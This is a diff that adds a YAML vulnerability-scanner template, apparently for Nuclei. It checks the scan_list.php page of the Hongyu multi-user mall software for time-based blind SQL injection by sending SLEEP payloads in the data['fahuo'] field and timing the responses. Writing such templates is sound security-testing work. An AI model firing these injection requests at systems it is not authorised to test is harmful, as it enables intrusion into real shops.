@@ -1,0 +1,43 @@
+id: hongyu-shangcheng-list-sqli
+info:
+  name: hongyu-shangcheng-list-sqli
+  author: apple
+  severity: high
+  description: 鸿宇多用户商城scan_list.phpSQL注入漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /scan_list.php HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(3)))QkUH)&act=view
+      - |-
+        POST /scan_list.php HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(6)))QkUH)&act=view
+      - |-
+        POST /scan_list.php HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        data['fahuo']=(SELECT 2753 FROM (SELECT(SLEEP(9)))QkUH)&act=view
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
